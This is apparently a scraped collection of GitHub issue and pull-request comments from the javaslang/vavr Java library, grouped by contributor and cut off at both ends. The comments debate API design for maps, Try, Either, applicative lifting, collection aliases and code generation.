Character since Character is final, but that does not typecheck. ? extends Character is needed for it to type-check.\n\nSo as I said I think the last question is do we add an unfold besides unfoldLeft & unfoldRight. See my previous questions on that topic: https://github.com/javaslang/javaslang/pull/1370#issuecomment-225448815\nI also asked:\n\nBtw just curious about fold being a left fold but with a single type parameter instead of two. Is it meant to make the job simpler for the type checker?\n. ok added the less-polymorphic unfold(). Note that for CharSeq it's not polymorphic at all anymore => it's fully hardcoded to Character.\n. sure, I can modify the PR, that's a simple one. I'll make a second commit shortly adding putOrUpdate(Tuple2, Function2<V, V, V>)\n. I made a second commit to add the Tuple support. I reimplemented the function to call the lower-level Tuple version instead of calling directly putOrUpdate(x._1, x_2, merge), assuming that also put was reimplemented for tuples because it can be specially optimized.\n. thanks, will do.\nAlso looking at the type of the Function2. Java8 map.merge is:\n\nFunction2<? super V, ? super V, ? extends V>\n(well they use BiFunction obviously) I've read a bit on super vs extends now and... I'm hoping you're familiar with this, because I won't dig too deep in this right now ;)\nSo do I go also with this super/extends setup?\n. pushed with the suggested changes plus the super & extends in the Function type.\n. ...in case someone would pass an actual BiFunction & not a lambda with type inference. I get it. Pushed.\n. I had forgotten the defensive null check for the merge function. Pushed now. Do squash the commits if you pull ;-)\n. trust me, on the final issue you're  preaching to the converted :)\nI'm still picking up the discipline to actually type final in java, but I support it and want it 200%.\nI'll make another commit with the requested changes sometime until the evening, thanks for the feedback! This PR is definitely interesting for me from the point of view of API design & inheritance-related type constraints =D\n. done, I think!\n. actually it crossed my mind that with overloading in java would have even just an overload to put with the three parameters. No need for putWith. Maybe putWith is clearer though. https://github.com/javaslang/javaslang/issues/1379#issuecomment-226170608 may be relevant where we could have mapKeys or mapKeysWith potentially.\n. renamed it to put as discussed.\n. note that haskell offers mapKeys & mapKeysWith:\nhttps://hackage.haskell.org/package/containers-0.5.7.1/docs/Data-Map-Strict.html#v:mapKeys\nthe second call allows to provide a function to merge two values in case of conflict. I think that makes a lot of sense to offer the second call at least.\nAlso note that haskell gives a rule for the value in case of a conflict: it says \"the greatest is kept\". If there is no rule I guess you could get baffling behaviours where two sets which look the same map to two different sets (one or the other of the values is kept) depending on factors that don't seem relevant at first sight.\n. Yes that map for which I gave the link is tree-based. There is a HashMap too but apparently it doesn't have the mapKeys function.\n. Of course! I think CheckedFunction.liftTry is exactly what I suggested, so i'm a happy camper =D\n. regarding the unfold* they were meant to be public. I missed it because I first added them to List and that's an interface, no need for the public there. I should have added the public when implementing it in classes, but I missed it. So yes, it should be made public.\n. hmm wait this is static. Maybe the public would be needed also for interfaces like List then? (nope checked it actually no need for public even for static functions of an interface)\n. surely you're aware of http://immutables.github.io/ ? Maybe it's a little overreaching for javaslang, although javaslang-match support for such value objects would be great.\nI've also had this issue with annotation processors in the immutable project described on the immutables website:\n\nNote: There's known issue with the interaction between the incremental compilation feature of javac and annotation processing. Build tools like Maven are also affected by this bug. Typically, commands such as mvn clean compile will resolve any such problems by a forcing full build. Disabling incremental compilation is also an option:\n<!-- Prevents an endPosTable exception during compilation -->\n<useIncrementalCompilation>false</useIncrementalCompilation>\n\nSadly for me this pom.xml setting did not prevent the issue in a test project, and I had to use clean. I plan to give it another try when I get 5 minutes.\n. maybe it should just be present on Tuple2. Not present at all on 3+\n. FWIW I do regret a little the shorter f1 compared to function1. Maybe fun or func could be options? (that said it's typically an API for which each company or project could override the API locally and define whatever they want if they so wished)\n. should be closed I guess?\n. just build the app IIRC: mvn install and it'll regenerate the generated code.\n. Well the javadoc was lifted from toUpper() to be honest :$\n. wow, even a toValidation in Value? Didn't dare mentioning it :-)\nSounds great! I'll take your code, add tests, add Validation, and submit a PR ASAP then!\n. I'll look at javaslang-pure, not sure how it would fit or how much work there is there. It seems then that it won't be static functions as I had in mind then.\nAlso, I realized sequence actually wouldn't help for this use-case (because all of the items in the list must have the same type). am I missing something, or do you agree a use-case is currently not covered by javaslang currently here? Example...\nI have a Future<UserInfo>, Future<List<UserRight>>, Future<AppConfig>.\nAnd now I want to fetch all of them in parrallel and call a function which takes UserInfo, List<UserRight>, and AppConfig, and returns a User -- and get back a Future<User>.\nNot sure how to achieve this today in javaslang, that would cover that use-case (and similar ones with Try, Option and so on). There is for instance Future.reduce, but again.. Same type for all the items.\n. yeah definitely no rush!! just thinking out loud mostly :P\n. ok I've been looking at javaslang-pure's Monad class. I've also looked more in Future and first I must say that in my previous comments on this bug I was confused about two things: 1/ I didn't realize that future is launched async the moment it's instantiated (therefore my concerns about running futures in parallel were unwarranted), and 2/ applicative does not necessarily mean that the branches are run in parallel.\nSo anyway the API I had in mind was:\nOption.lift((Integer a, Integer b) -> a+b).apply(Option.of(1), Option.of(2))\n=> Some(3)\n\nWhat Monad from javaslang-pure allows this is:\n Monad.lift((Integer a, Integer b) -> a+b).apply(Monad.of(Option.of(1)), Monad.of(Option.of(2)).narrow()\n=> Some(3)\n\n(assuming we add a Monad.of taking an option, but I did that locally, it's no problem.. actually pure copy-paste of the List version, since it relies on the underlying map & flatMap of the underlying type)\nSo actually the Monad API covers the need I highlighted... Same functionality. I was mentioning applicative because in this case an applicative is enough. But of course you can also do that with a monad. So that's the API I was looking for!\nIt is quite verbose though. We have an interface Monad, which contains map & flatMap. It's pretty elegant that the first type parameter of monad is the type of the monadic instance. But in the end it seems to me that this type doesn't buy us much?\nWe must \"lift\" the values in the Monad with Monad.of, and later narrow them. At the same time, in Monad we have map & flatMap, but we already had that on the type we wrap?\nIt could be useful to add the Monad type if we could compose Monads with one another, if a function was taking a Monad instance as input parameter, but unless I'm missing something that's not the case now, and I can't think of any such function.\nSo in the end I'm not sure what the class Monad brings? Right now appart from theoretical cleanliness it seems to me what I had in mind gives us the same features but in a less verbose way, but most probably I'm missing something?. by the way, you mentioned earlier haskell is a good inspiration. The haskell function I have in mind liftA2 (and liftA and liftA3).\n> :t liftA2\nliftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c\n\nThis signature is as I mentioned: Function2 => Function2 (and same with Future, Try, ...).\nAnd:\n> liftA2 (+) (Just 5) (Just 6)\nJust 11\n\nfor reference, liftM2:\n> :t liftM2\nliftM2 :: Monad m => (a -> b -> c) -> m a -> m b -> m c\n\n. Good points! For me, I think this mechanism is useful enough to fit in the actual javaslang module, but it's your call obviously.\nBut if we put them there, there is the issue that we want to use code generation (we'll want the overloads probably up to Function7), and the classes for Option, Try and so on are not code generated.\nPutting them there would be more elegant in a way Option.lift vs Monad.liftOption, but we probably don't want to sprinkle each class with code generated sections... So for that technical reason we could mix them all in a single class, like Monad. Now, how we name that class (Monad or something else), and whether we put it in the pure module or not... It's probably a decision for you to make.\nIn a way it could be irrelevant with the 2.1 approach of importing everything in a single namespace. We could put these functions directly in API... (but in that case I'm unsure whether we would capitalize them or not).\nOne more thing... I was looking again at the API of the Validation class, which also runs on applicative:\nValidation<List<String>,String> result = valid1.combine(valid2).ap((name,age) -> \"Name: \"+name+\" Age: \"+age);\n\nIt is clearly again solving the same problem, but it's the same thing as with the Monad class in pure, that you must wrap each Option (for instance), while with the API I had in mind, that would not be necessary. Just mentioning another data point, food for thought.. ok, about the class name... in haskell liftA2 is under Control.Applicative. Now I see in scalaz it's also under applicative (search for lift, lift2, ...). Well actually Applicative extends Functor and Apply among others, and lift is in Functor, and from lift2 they're in Apply. So I guess the name could be Applicative or Apply, based on that.\nIn scala cats, though my scala is a bit weak to really understand the type definition, it seems the function is called mapX under Apply:\n\nControl.Applicative defines a function that\u2019s called liftA2, which has a type of\nliftA2 :: (Applicative f) => (a -> b -> c) -> f a -> f b -> f c .\n\nRemember parameters are flipped around in Scala. What we have is a function that takes F[B] and > F[A], then a function (A, B) => C. This is called map2 on Apply.\n\nsee cats Apply\nSo I guess Applicative or Apply are options. Otherwise we could say we implement liftM2 not liftA2 (which is the same in most cases) but a google for scalaz liftM2 or cats liftM2 doesn't yield anything special. It's true that really you rarely need liftM2, liftA2 is mostly the same in non-degenerate cases I would say.\nPS: this lift in theory could be implemented for all applicatives, including List for instance =>\n> liftA2 (+) [1,2] [3,4]\n[4,5,5,6]\n\nI didn't mention those so far, as List.lift() would have been \"strange\", but if we do a separate class maybe we can include them, though the list monad/applicative starts getting a little in the \"advanced\"/unintuitive territory in a way.. yes turns out the {@code is much better because > and < are allowed inside. they're NOT allowed inside <code>, and that was a problem with these examples which I migrated because of the lambda arrow, \"->\".\n. noticed this twitter comment on the separation of arbitrary and shrink, maybe it's helpful =>\nhttps://twitter.com/mapastr/status/801070809880166401. I'm going to ignore the sputnik complaints about generic types being named with digits inside. Let me know if I shouldn't.. I agree with your comments, my original bug called for Option.lift, Try.lift and so on. I lamented the complexity of partial generation, and decided to go with a single file based on that. So we can pause work until we have the architecture for partially generating file, which I agree is better. Probably I won't be the person doing that work though :-(\nRegarding type variants I'm not sure what is your conclusion in the end? We know what is best (and if yes, what is it?) or we don't yet?\nAs I said I'll also peek at the implementation in haskell, maybe we shouldn't rely on flatMap to be completely correct.. so yeah I mean what is implemented is liftM2. We use the monadic functions. We could achieve the same thing without requiring monads though. But maybe it's irrelevant.. closing the PR for now then. We can resume communication on the bug probably. When there is partial generation support you can ping me on the bug, or probably you can pick this up and code it to the end. Thanks for the feedback! Hopefully this work here can be resumed soon. If you think partial generation is far off, and you have a precise idea how it could be done, maybe I can assist, but I have no idea how I would get started right now.. But if we modify the source files, it'll require annoying discipline not to commit processed files (when we must commit the original, with the generation code).\nThe workflow would be what then, generate to work, then git reset these files before commiting? Even with a script, it seems very kludgy and unintuitive.\nAlso what do we ship in -src.jar? Presumably processed source, or it will confuse IDEs who know how to download sources.\nNotice that this applies to both proposals. Seems to me like we really need a distinction like src and src-gen?. Hmm no i was wrong. We always commit with generated code, but keeping the markers. If the generator code is inline we don't remove it, but keep it, commented out.\nI think keeping the generator code out is better. We can get syntax highlighting, and possibly in rhe future, we can avoid regenerating by comparing timestamps of the partially generated file and the generator source.. just to add my grain of salt: IMO the option to easily convert to mutable java collections is crucial. We've been able to convert a relatively big codebase to (mostly) javaslang because we knew we can port an isolated unit to generate and operate on javaslang collections, then get a java collection from it trivially and pass it on to the rest of the program. We ported the app piece by piece in that fashion. If by default asJavaList() returns an immutable collection that throws when you attempt to modify it, then that cannot be used for that purpose, because we can't assume anything about what the legacy code we're communicating with is doing. So for such a porting, I think you really need a functionality such as the existing toJavaList(). If it gets verbose to achieve that, we (our team) would have had to write helpers for conversion, and that's just friction getting in the way of migrating to javaslang.. For me as I said, I think the toJava* are needed, glad they're not in question. For the new asJava views, no opinion. I'm sure there are useful use-cases, didn't need it so far though. They definitely sound cool (although allowing modifications sounds overkill, but maybe it can be implemented without the complexity exploding).. interesting question on the narrowing and equals/hashcode. I've written a small test program. If the narrowing was a problem, I guess it should output 2/1 (in other words the narrowing made both items in the set become equal). But the output is 2/2 so it seems it's the dynamic type which is taken into account for the dispatch, thankfully:\nhttps://gist.github.com/emmanueltouzery/848b9f8ae163acf87c113f4abdcbd5bf. ok I think I've applied your suggestions! I've keep \"getKey\" and \"K\" as opposed to \"classifier\" and \"C\" since I guess we don't \"group\" in \"classes\" but \"arrange\" by \"keys\".. i think he means the \"maven-central: unknown\" on the vavr home page. which is due to no vavr artifacts having been released yet, pending 0.9.0.. I can give our experience of migrating a pretty large codebase from java collections & streams to vavr, and still today mixing both (because of using JPA for DB access, we must still use java's collections for DB entities).\nwe have no issue with the naming, even though we use vavr List. We would have even less had we decided to use vavr's Vector since java's version is obsolete and non-generic. It is a bit of an annoyance because there must be some switchover point where you go from default import being java.util.List and having to have an explicit io.vavr.collection.List to the final state when you have a default import to vavr and an explicit java.util.List.\nI must add, this may seem funny, it helped us no end that vavr picked append() while java has add(). Immediate compilation failure when porting old code, which is great because of the difference in behaviour -- java.util's version is side-effecting and for vavr you must overwrite the variable or else the effect is not taken into account!. yeah I implemented the Either<L,Seq<R>> version because that's what haskell does:\nhaskell\n\u03bb: sequence [Right 5, Left \"bad\", Left \"so bad\"]\nLeft \"bad\"\n\u03bb: :t sequence @[] @(Either String)\nsequence @[] @(Either String)\n  :: [Either String a] -> Either String [a]. sorry I see reduceLeftOption already exists. too bad the option variants aren't the default though :(. Maybe it's proper that both versions are present but if it was me, I would change naming to emphasize that one version is safe the other fast. Like head/headNoOption or headPresent, reduce/reduceNoOption or reducePresent...\nSafe by default, fast if you need it and are aware of the caveats. But you may disagree or consider it's too late of course.. As you know i wrote the prelude.ts typescript library where I had to make these choices again. In my case I don't have an Option.get method, or, well I have it, but I called it getOrThrow (i also have Some.get and you can call it using TS type guards but it's another story).\nSo all I'm saying is, keep the throwing methods, but make sure it's obvious to the user that they can throw. Seq.max returning an int doesn't worry me as much: it's pretty obvious from the type that if you give it a list of Strings it can do nothing but throw (in prelude I made max take a lambda T->number always but I'm less concerned about performance). That said, a safe and fast variant for max could be List.of(1,2).transform(List::max) which would be static and accept Seq<Number> (with overloads). But it's less discoverable.\nAnyway we've had a crash in prod due to an experienced developer using reduce on an empty list. We can blame the developer or java. I think choosing an explicit naming is a pragmatic solution but maybe it's too late for vavr. In any case vavr remains an awesome library!. If you decide these ideas are worth a shot I'd be delighted to prepare a PR! But i'm most concerned about back compatibility.. Hmm i don't know about hiding Left and Right. It will make the apidoc cleaner, but it may become a hindrance if/when java gets pattern matching ( http://cr.openjdk.java.net/~briangoetz/amber/pattern-match.html ).\nIt depends how you go with methods which would fit only on Right. For instance Either could have getLeft and getRight both returning Option or getLeftOrThow and getRightOrThrow, while Left could have getLeft returning L and Right could have getRight returning R. So pattern matching would ensure safe calls.\nBut we could always revisit that if/when java does get this pattern matching. Hide now and add back then maybe. Currently java/vavr instanceof matching is not very idiomatic. In prelude.ts Either Either has getLeftOrElse, getLeftOrThrow, getOrElse, getOrThrow. Right has get. Left has getLeft.. no issue from me in renaming to filterOrElse if that's what vavr authors prefer.. Thanks for the feedback! I'm currently in holidays, i can implement the changes from august 4. I'll get to it as soon as i can.. ok i have applied the requested changes. this class Example in the javadoc was in several spots in Either.java so I made a separate commit to remove them, but you can squash both commits if you prefer. Let me know you wish for further changes :-). good point, fixed that bit of the apidoc by updating the second commit!. I'm a little curious though, about to versus transform. am I missing something, or every call to to could be replaced by a call to transform?\nIf that's the case, maybe cave could have only the latter, to reduce the API surface area?. Just a data point: I like the fluency of transform and would regret seeing it go. On the other hand, I can see why just removing the to* without adding a to() would leave people confused at how to port these calls.\nIn the end, if it was me, I think today in vavr, the to* calls and the transform calls serve different functions, and would keep both options.. For me, I 100% support the removal of Value, for the reasons you and others listed. Another thing which I would change if API compatibility with vavr 0.9 is broken would be more type-safety. For instance sum() on collections which throws if the collection type is not a Number, or reduce which throws if the collection is empty.\nThe modularization... I didn't really research the topic, but I view java9 modules as something which is useful to modularize big systems.. like the JDK (which was done). Or possibly very large enterprise software (like the way some systems today use OSGI). Intuitively I didn't think about splitting vavr itself; vavr feels \"small\", especially since it doesn't pull any dependency itself.\nOf the dependencies in our applications, vavr is among the smallest and definitely the highest value-for-size, so I didn't feel a need for modularization.\nActually to me the great added value of vavr and of FP libraries/preludes is the symmetrical/uniform API accross these concerns (Option, Either, collections, Future...). And I'm afraid that splitting them, this can be lost or hampered.\nCertainly to me the loss of sequence would be a disaster. The loss of Future would be a real disappointment, although I understand that it's caused by implementation complexity, not modularity. I think ideally a thin wrapper around java's CompletableFuture with an API similar to scala's Future and other vavr classes would go a long way.\nTo summarize I think vavr 0.9 really hit a sweet spot for many people, maybe more than you may have realized as the author. I agree with some concerns, that it would be a shame to loose some of this to gain benefits for a very small minority of users which would actually potentially take advantage of the modularity (and the maintainers, although I of course sympathize with the load of work that is yours as the vavr maintainer).. PS: regarding the modules, honestly we use it all, except for kotlin, gwt, some collections like Trees or OrderedMaps. I mean honestly dependency size is not a concern, we would just pull it all.\nPPS: another thing.. I see you'd drop Tuple and have some Entry class for map entries.. I just hope that Entry would also have map, map1, map2, transform like Tuple2 has.. Well as you can see I'm quite adverse to change in vavr... I really think it hit a nice sweet spot as it is.... Sounds great! Regarding tuples, Tuple2 might be enough. Tuple2 has a special role with Map in particular.. actually I don't think so. What I do here is what liftA2 does in haskell. The difference between applicative and monadic is more about whether a step in computation can reuse the results of previous steps in the computation. Since here the final step does NOT reuse intermediary results we do not need a monad, an applicative is enough. To give another perspective: if you have a monadic structure, you MUST perform the steps in a certain order, because a step may depend on the previous steps. If you have an applicative structure, the order is irrelevant. See also my comments in the bug: also scalaz and cats put this in the Apply/Applicative basket. I also gave an example with liftA2 in the bug the \"A\" in \"liftA\" is for \"Applicative\".. I think the terminology is \"applicative functor\" eg a functor containing a function. But I'm not super strong on the terminology, I was taking inspiration from the Learn You a Haskell for Great Good book:\nhttp://learnyouahaskell.com/functors-applicative-functors-and-monoids\n\nWhen we look at it like this, we can say that liftA2 takes a normal binary function and promotes it to a function that operates on two functors.\n\nBut we can change the comment, sure.. maybe it's really incorrect to use flatMap here btw. Haskell doesn't. I'll take a look.. I just re-read: http://stackoverflow.com/a/23346604/516188\nin applicative each step just transforms its input. in monadic style you can look at previous results too, and even also change the rest of computation. here we always perform the same steps, and each step only looks at its input. So I think we don't need the power of monads, applicative is enough. We can implement this feature with monads (that's liftM2 in haskell) but applicatives are enough (ilftA2 in haskell).. You are correct. This is liftM2 not liftA2, because we use flatMap. And yes, we would need <*> to get liftA2. So let's keep what we have.\nBut the empty chain is not a difference. It's the same thing with applicative.\n> liftA2 (+) Nothing (Just 6)\nNothing\n\nSimilarly:\n(+) <$> Nothing <*> (Just 6)\nNothing\n\nMy understanding is that except for degenerate cases, liftA2 and liftM2 will return the same results. In haskell there is a goal to reach for the least specific mechanism, therefore it would be strange to pick liftM2 when you can use liftA2. So this operation that we perform here would be referred to as \"applicative lifting\" by an haskeller, I think. But yeah we're not in haskell, we implement liftM2 in reality, let's call it monadic lift.. actually I wrote it without the <T> at first, but it doesn't build for me:\n[WARNING] /home/emmanuel/home/javaslang/javaslang/src/main/java/javaslang/collection/Traversable.java:[461,52] found raw type: javaslang.collection.Traversable\n\nmissing type arguments for generic class javaslang.collection.Traversable\nand later:\n[ERROR] /home/emmanuel/home/javaslang/javaslang/src/main/java/javaslang/collection/Traversable.java: warnings found and -Werror specified\n\nMaybe they removed the warning in a later version of java, but that sounds unlikely. Using 1.8.0_121.. hmm but in the end we do return the list in case of success. So maybe it's better to create directly the right format rather than paying the conversion cost later? Also note that I took Try.sequence as a model, it's done the same there; so if we change, we can change both.. One thing is for sure, these implementations are totally non-fp like (not using flatmap, filter and so on). So i guess elegancy shouldn't be a concern but only performance. I am not familiar with the system vavr has for benchmarks, hopefully it's not too difficult to measure? The other thing is that clearly memory use will be higher for create+convert compared to only create (spike at ~2x the memory use I guess).. yes for the narrow i was afraid of performance, since you say there's no difference then that's the way to go for sure. I'll update the PR tonight if you decide to keep it. Regarding containsAll: I missed containsAll completely!! Had I seen it, I would not have submitted this PR. So maybe we should close this PR as it's too similar to an existing feature, your call.\nRegarding custom comparators... I didn't consider that. I have no opinion. We could check for TreeSet and return false in case the comparators differ. It's pretty tricky. I have no experience with that use-case, not sure what would be the right answer.. ",
    "mladenbolic": "Hi,\nIs there a plan to support something similar, but more like a plain try/finally block?\ne.g. instead of using:\nSession session = getSession();\nTry.run(() -> runSomething())\n                .onFailure(t -> {\n                    session.close();\n                })\n                .andThen(() -> {\n                    session.close();\n                });\nwe would use\nTry.run(() -> runSomething())\n    .finally(() -> session.close());\n. Yes it's a keyword, just posted it as an example that it does not need to implement AutoClosable.\nAs for the cool name: finallyRun, thenFinally, always.\n. @danieldietrich Great idea, but I agree with @jknack here, WithResources(...) seams a bit awkward.\nAs for the suggested implementations, I prefer the first one suggested by @jknack. It's more Java-like and it would be natural for the user to first specify the AutoClosable supplier and then to do something with it inside the checked function.\nFor a with(...) that accepts one supplier we would have something similar already proposed for WithResources(...):\nstatic <T, A1 extends AutoCloseable> Try<T> with(CheckedSupplier<A1> supplier1, CheckedFunction1<A1, T> function1){\n        try(A1 autoCloseable1 = supplier1.get()) {\n            return Try.success(function1.apply(autoCloseable1));\n        } catch (Throwable x) {\n            return Try.failure(x);\n        }\n    }\n. ",
    "geolich": "Hi @danieldietrich Thanks for your quick reply. I found that it is a problem with AWS Lambda. I created a test \u03bb.class and tried to run it and got the same error. It has a problem to load classes with special characters. A bit ironic that AWS Lambda cannot detect the lambda character.\nThank you for your help.\n. ",
    "Conorrr": "Are you open to public contributions for migrating to Gradle?. I've prototyped running the codegen using gradle in the vavr-test sub-project.\nI've had to make a couple of changes to the scala that generates the java; primarily I have changed it from a script to a class, I couldn't find a clean way to run the scala script from gradle.  It wasn't possible using the plugin a couple of years ago and doesn't look like it is at the moment. Let me know if this messes with the general workflow.\nI have also changed the generator script to take 2 arguments, the output directories. This may also make your workflow harder, let me know if it does.\nWould be great to get some feedback.. Sure, I'll change both of them. Using src-gen is slightly unconventional but there isn't any technical reason it wont work.. ",
    "valery1707": "This methods will be implemented in #1385 \n. This issue was implemented by #1427 isn't it?. @danieldietrich, Traversable already have nonEmpty that have same behavior as discussed isNotEmpy().\nIs this issue need to be closed?\n. @paplorinc, method Traversable#nonEmpty was introduced in 2016-02-16 by @danieldietrich.\nThis discussion took place at 2016-05-08, when method already exists.\nIf this issue stil actual - I don't understand what need to be done.\n. Hi @ruslansennov \nI implement method in commit - need I create PR for this commit?\n. @ruslansennov here it: #1368 \n. @paplorinc I made changes by your comments\n. I can implement mapKeys(Function<? super K, ? extends K2> keyMapper, Function2<V, V, V> valueMerge) too.\n. @emmanueltouzery I am not familar with Haskel and dont know how Haskel internal store map.\nMy current implementation save value from last key, but only TreeSet store keys in predictable order and will process exactly same as Haskel. HashMap and LikedHashMap store keys without predictable order.\n. LinkedHashMap have predictable keys order too.\nUnpredictable behavior may be only in HashMap#mapKeys(Function)\n. @danieldietrich, ok I will add PR soon\n. @danieldietrich - PR #1383 created\n. @emmanueltouzery look into #1381: you can use it like list.map(CheckedFunction1.of(x -> runIoOperation(x, getParameterWhichCouldThrow())).trusted()), or recover at needed steps\n. @danieldietrich, I known Scala and want create PR, if you do not mind\n. Implementation is ready, it remains to add some Javadoc and tests\n. Remains only tests\n. @danieldietrich, PR #1385 created\n. @danieldietrich, fixed\n. Tests for Function_#liftTry() will be created soon\n. @danieldietrich, fixed:\n- currying instead of Tuples applied to recover and unchecked\n- simplify method argument types applied to recover, unchecked and liftTry\n. @danieldietrich, fixed\n. @danieldietrich, fixed\n. Good, I start implementing.\nYes, <K> and <V> was only example it will be <? super K> and <? super V>\n. @danieldietrich, implemented in #1404\n. Strange. Where codecov and Travis-CI?\n. How can I force Travis-CI to build this PR?\n@danieldietrich , @ruslansennov \n. @ruslansennov, may be I need to close this PR and open new?\n. @paplorinc, nothing I suppose.\nSame as Function1#identity and Function1#compose.\n. I propose this method only for Tuple2\n. @danieldietrich, fixed in AbstractMap#filter, AbstractMultimap#filter and Collections#mapKeys\n. May be this issue must be in milestone 2.1.0 as PR?\n. I can implement.\n. In release 2.1.0 Map will have meny new functions.\nPlease check \n1. #1401 \n    * filter(BiPredicate<? super K, ? super V>)\n    * filterKeys(Predicate<? super K>)\n    * filterValues(Predicate<? super V>)\n    * removeAll(BiPredicate<? super K, ? super V>)\n    * removeKeys(Predicate<? super K>)\n    * removeValues(Predicate<? super V>)\n1. #1379\n    * mapKeys(Function<? super K, ? extends K2>)\n    * mapKeys(Function<? super K, ? extends K2>, BiFunction<? super V, ? super V, ? extends V>)\nMap#mapValues() already exists.\n. After #1434 \n. TravisCI stuck again\n. I confirm such behavior - trying to fix\n. Internally TreeSet mapped from V into Tuple<K, V> and this tuples compared between each other. Tuple trying compare values directly, but values not comparable.\n. Can I implement this?\n. @paplorinc maybe you create separate library with this class?\n. Duplicate #1241 ?\n. What about javaslang.collection.Seq#update(index, element)?\nNeed we deprecate old update(int, T) and create new set(int, T)?\n. I ran into a situation where I need the Lazy#filter to return Lazy and now is not clear whether it will be or not?\nhttps://github.com/vavr-io/vavr/issues/1861#issuecomment-279389738\n\n@danieldietrich: making filter() lazy looks more consistent to my eyes, so let's do the change in 3.0.0\n\nAnd in this issue I see this point, but it striked out but not completed.\nIs this still on question or Lazy#filter always will return Option?\nP.S.\nSorry for terrible english :(. @danieldietrich I understand your point of view.\nI also do not know to represent empty lazy value :)\nI solved my problem just through sort of Lazy<Option<T>>.\nThe question is removed, thanks for the clarification. But we can this:\njava\nLazy<Option<T>> lazyOption = Lazy.of(() -> Option.of(...));\nLazy<Option<T>> filtered = lazyOption.map(o -> o.filter(predicate));\nAnd filtered still be lazy. @danieldietrich , I update JavaDoc - please check.\nLater I create tests and aliases for TreeSet and Map-s\n. @danieldietrich ok, soon. Anyway PR is not completed yet, I still need create tests and aliases for all Map-s and TreeSet\n. @paplorinc OK\n. @paplorinc currently I already mixed commits with adding different parts.\nAfter this PR will good for everyone, I can create new PR with splitted commits for different parts of API, or with merged all commits in one, for future simplicity\n. @danieldietrich @paplorinc @emmanueltouzery What alias use for Function1..8/CheckedFunction1..8?\n. @paplorinc I known about history rewrite and force push. I don't use force push with GitHub PR. If PR will correctly work with force push - I will rewrite history within this PR\n. @danieldietrich PR ready for check\n. @danieldietrich @paplorinc now I have some questions:\nWhat aliases we need for access for LinkedHashSet, HashSet, LinkedHashMap, HashMap?\n1. linkedHashSet, hashSet, linkedHashMap, hashMap\n2. linkedSet, set, linkedMap, map\nWhat aliases we need for access for TreeSet, TreeMap?\n1. treeSet, treeMap\n2. sortedSet, sortedMap\nIn alias for TreeSet/TreeMap we need return TreeSet/TreeMap or SortedSet/SortedMap?\nShould all aliases start with lower case or upper case character?\n. @danieldietrich @paplorinc \nAlready:\n- Removed hash from aliases for HashSet, LinkedHashSet, HashMap, LinkedHashMap\n- In name for TreeMap aliases used sorted prefix\n- Build Java's Stream directly\n- Add alias Seq, IndexedSeq\nSoon:\n- All aliases started with upper char\n. Now almost all aliases started with upper case char.\nAPI#None clashed with $#None and Patterns#None - what I need to do?\nCurrently API have only one lower case alias: none.\n@danieldietrich and @paplorinc please review\n. > I don't think that API#None clashes with $#None and Patterns#None. This is only the case then both are imported.\nYes, this happens only if both methods are imported. But at current time MatchTest use full static import from both API and Patterns.\nI change imports in MatchTest to import only required parts of API.\nNow all aliases in API start with upper case char.\n@danieldietrich and @paplorinc PR again ready for review.\n. @danieldietrich , I don't implement initializer for pairs because of they is not type-safe.\nWill be implemented.\nP.S.\nSorry for bad english :(\n. But in JEP 269 suggesed to add a set of fixed-argument methods, and Map.ofEntries( entry(k1, v1), entry(k2, v2), entry(k3, v3), /* ... entry(kn, vn)*/);.\nThey don't suggest add Map.of(Object...) as I see.\n@danieldietrich may be variant from @paplorinc is best than Map(Object...)?\n. @danieldietrich maybe create alias Map(Object...) with @Deprecated annotation?\n. Completed:\n- Rebase to current master. @ruslansennov all good, don't worry\n- All future's aliases excluded from GWT\n- All local variables are final\n- Minor fixes in Generator for Either, Try and Future\n- Remove Nothing\n- Fix typos in some JavaDoc\n- Use {@link ClassName} inplace of {@code ClassName}\n- Add alias for PriorityQueue\n- Add aliases for empty collections and maps\n- Add aliases for maps of tuple vararg\n- Add unsafe alias for maps with Object vararg\n@danieldietrich and @paplorinc please review.\n. Is this issue duplicate #1535 ?\n. PR #1500 has milestone 3.0.0, but this issue has milestone 2.1.0. It's incorrect.\n. @danieldietrich JavaDoc fixed\n@paplorinc I don't have any real-world application for this method yet. But I inline call to await() in FutureTest\n. @danieldietrich please check JavaDoc\n. @danieldietrich please check JavaDoc\n. > I'm currently thinking about removing Future from Vavr 1.0 because there seem to be several great alternatives for Java, including CompletableFuture of the standard library.\nI like in vavr's Future that it is integrated with other vavr's classes. Other alternatives can't have such deep integration.. @chb0github your Iterator#iterate(Supplier<T>, Predicate<T>) can be replaced with exists Iterator.continually(Supplier<T>).takeUntil(Predicate<T>): Iterator.continually(StringUtils::randomString).takeUntil(s -> s.length() > 10). Variant iterate(Supplier<Option<? extends T>>) is more suitable as I think.\nThis situation looks like the https://github.com/vavr-io/vavr/issues/2134#issuecomment-342297157. Fail in JDK 9 is not my fault. @danieldietrich, need I reorder position of method recurse? As I remember, methods in this project has some rule of sorting. Maybe between fill and collect?. @danieldietrich I update commit. Some example:\n```java\npublic class MenuItem {\n  Long id;\n  Long parentId;\n  Long organizationId;\n  String name;\n//todo getters and setters a hidden\npublic toString() {\n    return getName();\n  }\n}\npublic class MenuLoader {\n  private final EntityManager em;\n  public Tree loadMenu(Long organizationId) {\n    TypedQuery query = em\n      .createQuery(\"SELECT T FROM MenuItem WHERE (T.organizationId = :organization)\");\n    query.setParameter(\"organization\", organizationId);\n    java.util.List items = query.getResultList();\n    return Tree.build(items, MenuItem::getId, MenuItem::getParentId);\n  }\n}\npublic class MenuLoaderTest() {\n  @Mock\n  private EntityManager em;\n@Mock\n  private MenuLoader menuLoader;\n@Before\n  public prepareDatabase() {\n    em.createQuery(\n      \"INSERT INTO menu_item(id, parent_id, organization_id, name) VALUES\"\n      + \"\\n  (1, NULL, 1, 'I')\"\n      + \"\\n, (2, 1, 1, 'II')\"\n      + \"\\n, (3, 1, 1, 'III')\"\n      + \"\\n, (4, 2, 1, 'IV')\"\n      + \"\\n, (5, 2, 1, 'V')\"\n    ).executeUpdate();\n  }\n@Test\n  private void testLoad() {\n    Tree tree = menuLoader.loadMenu(1);\n    assertThat(tree.toLispString).isEqualTo(\"(I (II IV V) III)\");\n  }\n}\n``. My current implementation internally useList#groupByfunction for buildMap>and then useTree#recursefor build children for founded roots.\nComplexity of theList#groupByisO(n)as I think.\nComplexity of theTree#recurseis aboutO(log n)if I correct analyze function.\nResult complexity of theTree#buildisO(n * log n)`.\nI create PR with implementation in #2129. Partial implementation: at least Javadoc is incomplete. @danieldietrich sorry for long delay :(\nI update Javadoc and add to Value method 